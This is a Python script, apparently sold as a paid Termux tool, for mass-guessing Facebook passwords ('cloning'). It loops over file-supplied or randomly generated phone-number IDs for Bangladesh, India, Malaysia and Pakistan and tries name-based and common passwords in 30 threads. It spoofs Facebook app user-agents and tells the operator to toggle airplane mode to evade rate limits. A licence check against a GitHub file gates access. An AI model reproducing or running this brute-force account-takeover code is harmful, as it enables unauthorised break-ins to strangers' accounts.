        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
        
####
def M2():
    ua = f"[FBAN/FB4A;FBAV/{str(random.randint(11, 77))}.0.0.{str(random.randrange(9, 49))}{str(random.randint(11, 77))};FBBV/{str(random.randint(1111111, 7777777))};[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{{density=2.0,width=720,height=1280}};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]

import os
import sys
import datetime
import platform,hashlib
from datetime import datetime,timedelta

class User_Pro:
    def __init__(self,username,active_time,user_time):
        self.username = username
        self.userkey = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
        self.active = datetime.strptime(active_time, "%d-%m-%Y")
        self.expire = self.active + timedelta(days=int(user_time))
    def check_key_status(self):
        current_date = datetime.now()
        if current_date >= self.expire:
            return "EXPIRE-KEY"
        else:
            return "ACTIVE-KEY"
    def get_details(self):
        status = self.check_key_status()
        return {
            "USERNAME":self.username,
            "USER-KEY":self.userkey,
            "ACTIVE-TIME":self.active.strftime("%d-%m-%Y"),
            "EXPIRE-TIME":self.expire.strftime("%d-%m-%Y"),
            "USER-STATUS":status,
        }
import os,re
import requests
MY_KEY = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
class Get_Data:
    def __init__(self):
        self.url = "https://raw.githubusercontent.com/Darkx221/Approval/refs/heads/main/ATOM"
    def get(self):
        respone = requests.get("https://raw.githubusercontent.com/Darkx221/Approval/refs/heads/main/ATOM").text
        if MY_KEY in respone:
            username,active,expire = re.findall(f"USERKEY={MY_KEY}=USERNAME=(.*)=START=(.*)=EXPIRE=(.*)=LIVE",respone)[0]
            userfind = User_Pro(username,active,expire)
            value = userfind.get_details()
            Main(value).menu()
        else:
            clear();print(f"{A}[{R}●{A}] {G}USERNAME{R} : {A}MR ATOM");print(f"{A}[{R}●{A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}●{A}] {G}YOU ARE NOT PREMUIM USER FIRST BUY PREMUIM');linex();print(f"{A}[{R}●{A}] {G}IF YOU WANT TO BUY COMMAND BY YOUR OWN WILLING, SEND {A}350 [15 DAYS] {G}|{A} 600 [30 DAYS] {G}TO THE GIVEN BKASH ACCOUNT AND SEND YOUR TOKEN AND PAYMENT SCREENSHOT TO THE GIVEN WHATSAPP NUMBER");linex();print(f"{A}[{R}●{A}] {G}1 TOKEN IS ONLY FOR 1 DEVICE, YOU CANNOT TRANSFER YOUR SUBSCRIPTION");linex();print(f"{A}[{R}●{A}] {G}YOUR ARE ONLY ELIGIBLE TO GET REFUND OR AGAIN SUBSCRIPTION, IF YOURTOKEN IS NOT CHANGED. IF HAPPENS, YOU WILL NOT BE ABLE TO CLAIM REFUND OR RECOVERY OF SUBSCRIPTION");linex();print(f"{A}[{R}●{A}] {G}IF YOUR SUBSCRIPTION ENDS BY CLEARING DATA, SYSTEM UPDATE,DELETING TERMUX OR DOWNGRADING AND UPGRADING TERMUX APK,YOUR WILL NOT BE ABLE TO GET SUBSCRIPTION UNTILL YOU PAY AGAIN");linex();print(f"{A}[{R}●{A}] {G}WHATSAPP NUMBER{R} >> {G}+8801804509736");linex();print(f"{A}[{R}●{A}] {G}FACEBOOK ID    {R} >> {G}DIPfire");linex();input(f"{A}[{R}●{A}] {G}TELEGRAM ID    {R} >> {G}@ATOMfire");linex()
            sys.exit()
import os
class Main:
    def __init__(self,value):
        self.name = str(value["USERNAME"])
        self.token = str(value["USER-KEY"])
        self.active = str(value["ACTIVE-TIME"])
        self.expire = str(value["EXPIRE-TIME"])
        self.status = str(value["USER-STATUS"])
    def check(self):
        if self.status == "EXPIRE-KEY":
            clear();print(f"{A}[{R}●{A}] {G}USERNAME{R} : {A}{bal}");print(f"{A}[{R}●{A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}●{A}] {G}YOU ARE NOT PREMUIM USER FIRST BUY PREMUIM');linex();print(f"{A}[{R}●{A}] {G}IF YOU WANT TO BUY COMMAND BY YOUR OWN WILLING, SEND {A}350 [15 DAYS] {G}|{A} 600 [30 DAYS] {G}TO THE GIVEN BKASH ACCOUNT AND SEND YOUR TOKEN AND PAYMENT SCREENSHOT TO THE GIVEN WHATSAPP NUMBER");linex();print(f"{A}[{R}●{A}] {G}1 TOKEN IS ONLY FOR 1 DEVICE, YOU CANNOT TRANSFER YOUR SUBSCRIPTION");linex();print(f"{A}[{R}●{A}] {G}YOUR ARE ONLY ELIGIBLE TO GET REFUND OR AGAIN SUBSCRIPTION, IF YOURTOKEN IS NOT CHANGED. IF HAPPENS, YOU WILL NOT BE ABLE TO CLAIM REFUND OR RECOVERY OF SUBSCRIPTION");linex();print(f"{A}[{R}●{A}] {G}IF YOUR SUBSCRIPTION ENDS BY CLEARING DATA, SYSTEM UPDATE,DELETING TERMUX OR DOWNGRADING AND UPGRADING TERMUX APK, YOUR WILL NOT BE ABLE TO GET SUBSCRIPTION UNTILL YOU PAY AGAIN");linex();print(f"{A}[{R}●{A}] {G}WHATSAPP NUMBER{R} >> {G}+8801804509736");linex();input(f"{A}[{R}●{A}] {G}TELEGRAM ID    {R} >> {G}@ATOMfire");linex()
            sys.exit()
        elif self.status == "ACTIVE-KEY":
            menu()
    def menu(self):
        os.system("clear")
        self.check()
#__________________| BIT |__________________#   
import os, platform, time, sys
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mAssalam O Alaikum\33[1;91m⊁ ')
time.sleep(1)
os.system('clear')
import os, platform, time, sys
try:
 import requests
except:os.system("pip uninstall requests -y;pip install requests")
print('\033[1;91m[\033[1;97m-\033[1;91m] \033[1;92mChecking For Update. . . .')
os.system(f'xdg-open https://www.facebook.com/dip.biswass.2020')
time.sleep(2)
os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 64BIT USER') 
elif bit == '32bit':
 print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 32BIT USER')

#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'

#≈≈≠≠≠≠≠≠≠ Colour
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';Q = '\x1b[1;97m'
#---------Style
style = (f"{A}<{G5}/{A}>{G}")
def clear():
    os.system('clear')

clear()

loop=0
oks=[]
cps=[]
cpc=[]
user=[]
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

#__________________| LOGO |__________________#
logo=(f"""
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

\033[1;32m[\033[1;31m✓\033[1;32m] Author     : ATOM× BEB
\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : 
\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : Dip Biswass
\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile ×\033[1;35mRandom 
\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m{version}
\033[1;32m[\033[1;31m✓\033[1;32m] TOOL       : \033[1;33mGreen
\033[1;32m[\033[1;31m✓\033[1;32m] STATUS     :\033[1;35m PAID
\033[1;32m[\033[1;31m✓\033[1;32m] WHAT'S UPP.:\033[1;35m 01804509736 
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m[\033[1;31m✓\033[1;35m Your_Key : {MY_KEY}
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________| MAIN |__________________#
def clear():
	os.system('clear')
	print(logo)
#_________Year checker_________#
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 👻'
        elif uid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 😕'
        elif uid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 😁'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 🥵'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 😇'
        elif uid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 😳'
        elif uid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 🥺'
        elif uid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 😲'
        elif uid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 🤧'
        elif uid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 😒'
        elif uid[:6] in ['100009']          :alif = ' ACCOUNT 2015 😒'
        elif uid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 🤫'
        elif uid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 😜'
        elif uid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 🥳'
        elif uid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 😝'
        elif uid[:5] in ['10005']           :alif = ' ACCOUNT 2020 🤗'
        elif uid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 👌'
        elif uid[:5] in ['10008']           :alif = ' ACCOUNT 2022 🤭'
        elif uid[:5] in ['10009']           :alif = ' ACCOUNT 2023 😍'
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' ACCOUNT 2008/2009 👐'
    elif len(uid)==8:
        alif = ' ACCOUNT 2007/2008 🥀'
    elif len(uid)==7:
        alif = ' ACCOUNT 2006/2007 😊'
    else:alif=''
    return alif
 
#__________________| MAIN |__________________#
def menu():
        try:
                
                        clear()
                        print(f'{G}[{A}1{G}]{G} FILE CLONING \n{G}[{A}2{G}]{G} RANDOM CLONING\n{G}[{A}3{G}]{G} CONTACT TOOL OWNER\n{G}[{A}0{G}]{G} EXIT TOOL')
                        linex()
                        xd=input(f'{G}[{A}?{G}]{A} CHOICE : ')
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/ATOM.txt ');linex()
                                file = input(f'{G}[{A}?{G}]{G} FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlinexs()
                                except FileNotFoundError:
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]\n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]\n{G}[{A}4{G}]{G} METHOD {G}[{A}M4{G}]');linex()
                                mthd=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                clear()
                                plist = []
                                print(f'                  PASSWORD SYSTEM');linex();print(f'{G}[{A}1{G}]{G} AUTO PASSWORD CLONE\n{G}[{A}2{G}]{G} CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('First Last')
                                        plist.append('first786')
                                        plist.append('firstlast123')
                                        plist.append('firstlast786')
                                        plist.append('firstlast@123')
                                        plist.append('first@123')
                                        plist.append('firstlast@12345')
                                        plist.append('firstlast@#')
                                        plist.append('first123@#')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD LIMIT : '))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : firstlast{G}/{G}first@@{G}/{G}first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD NO {i+1} :{A} '))
                                clear()
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] CP ID SHOW (y/n) ')
                                linex()
                                cx=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNT :{A} '+total_ids+f' {G}<{A}-{G}> METHOD :{A} M{mthd}')
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(api4,ids,names,passlist)
                                                    
                                print('\033[1;37m')
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                ___RANDOM___()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/dip.biswass.2020');menu()
                        elif xd in ['0','05']:
                                exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] BYE BYE ')
                        else:
                                exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] OPTION NOT FOUND IN MENU...')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] NO INTERNET CONNECTION...')
                exit()
#====================[RANDOM MENU]==========================
def rmpassconf(num,type):
        if 'first' in type:
            try:
                code = type.split('t')[1]
                password = num[:int(code)]
            except:
                password = num
        elif 'last' in type:
            try:
                code = type.split('t')[1]
                password = num[-int(code):]
            except:
                password = num
        else:
            password = type
        return password

       
def ___RANDOM___():
    clear()
    print(f'{red}[{white}A{red}]{green} BD RANDOM ')
    print(f'{red}[{white}B{red}]{green} INDIA RANDOM')
    print(f'{red}[{white}C{red}]{green} MALAYSIA RANDOM')
    print(f'{red}[{white}D{red}]{green} PAKISTAN RANDOM')
    print(f'{red}[{white}E{red}]{green} NEPAL RANDOM')
    print(f'{red}[{white}F{red}]{green} BACK MENU')
    linex()
    error_ = input(f'{red}[{white}◆{red}]{green} Selection {white}▶ {yellow}︎')
    if error_ in ['A','a','01','1']:___BD___()
    elif error_ in ['B','b','02','2']:___INDIA___()
    elif error_ in ['C','c','03','3']:___ML___()
    elif error_ in ['D','d','04','4']:___PK___()
    elif error_ in ['E','e','05','5']:___NP___()
    elif error_ in ['F','f','06','6']:___ATOM___()
    else:___RANDOM___()
#====================[BD RANDOM]==========================
def ___BD___():
    clear()
    print(f'{red}[{white}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}018 017 016 013{red}]');linex()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ {yellow}')
    clear()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');linex()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    linex()
    plist = []
    clear()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");linex()
    mtd=input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m▶︎ \x1b[38;5;208m")
    clear()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");linex()
    __CH__ = input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
        plist.append('@1234@')
        plist.append('@12345@')
        plist.append('@123456@')
        plist.append('@1234567@')
        plist.append('@@@@####')
        plist.append('@#@#@#')
        plist.append('708090')
        plist.append('506060')
        plist.append('203040')
        plist.append('102030')
        
    elif __CH__ in ["B","b","2"]:
        clear()
        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ {red}'));linex()
        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8{red}]")
        linex()
        for i in range(psl):
            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO-{i+1} {white}▶︎ \x1b[38;5;208m'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            tl = len(user)
            xb = love[2:]
            psd = plist
            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
    print(f'\r{white}================================================')
    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
    menu()
        
#====================[INDIA RANDOM]==========================
def ___INDIA___():
    clear()
    print(f'{red}[{white}◆{red}] {green}SIM CODES{white} ▶︎ {red}[{white}+91701 +91902 +91934 +91639{red}]');linex()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ \x1b[38;5;208m')
    clear()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');linex()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    linex()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");linex()
    ___error___=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    linex()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print("\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD")
    plist = []
    __CH__ = input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:       
        plist.append('57273200')
        plist.append('59039200')
        plist.append('07860786')
        
    elif __CH__ in ["B","b","2"]:
        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));linex()
        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
        linex()
        for i in range(psl):
            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m')); linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{___error___}')
        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{white}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');linex()
        for love in user:
            ids = code + love
            tl = len(user)
            psd = plist
            if ___error___ in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
            elif ___error___ in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif ___error___ in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif ___error___ in ['D','d','04','4']:error.submit(randm3, ids, psd,tl) 
    print(f'\r{white}================================================')
    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
    menu()
#====================[MALAYSIA RANDOM]==========================
def ___ML___():
    clear()
    print(f'{red}[{white}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}01125 01128 01137 01161{red}]');linex()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ \x1b[38;5;208m')
    clear()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');linex()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    linex()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");linex()
    mtd=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    plist = []
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD")
    __CH__ = input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
        plist.append('sabbir')
        plist.append('Bangladesh')
        plist.append('bangladesh')
        plist.append('708090')
        plist.append('saiful')
        plist.append('shakil')
        plist.append('112244')
        plist.append('008899')
        plist.append('jannat')
        plist.append('arafat')
    elif __CH__ in ["B","b","2"]:
        psl = int(input(f'{red}[{white}√{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));linex()
        print(f"{red}[{white}√{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
        linex()
        for i in range(psl):
            plist.append(input(f'{red}[{white}√{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));linex()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}√{red}]{green} TURN {green}[{white}ON{white}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            tl = len(user)
            xb = love[2:]
            if mtd in ['A','a','01','1']:error.submit(randm, ids, plist,tl)
            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, plist,tl)
            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, plist,tl)
            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, plist,tl)
    print('')
    print(f'\r{white}================================================')
    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}√{red}]{green} PRESS ENTER TO BACK MENU ")
    menu()
#====================[PAKISTAN RANDOM]==========================
def ___PK___():
    clear()
    print(f'{red}[{white}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}0315 0345 0333{red}]');linex()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ \x1b[38;5;208m')
    clear()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');linex()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    linex()
    plist = []
    clear()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");linex()
    mtd=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    clear()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print("\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");linex()
    __CH__ = input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
        plist.append('khan123')
        plist.append('khan786')
        plist.append('khankhan')
        plist.append('khan khan')
        plist.append('khan1234')
        plist.append('khan12345')
        plist.append('102030')
        plist.append('203040')
    elif __CH__ in ["B","b","2"]:
        clear()
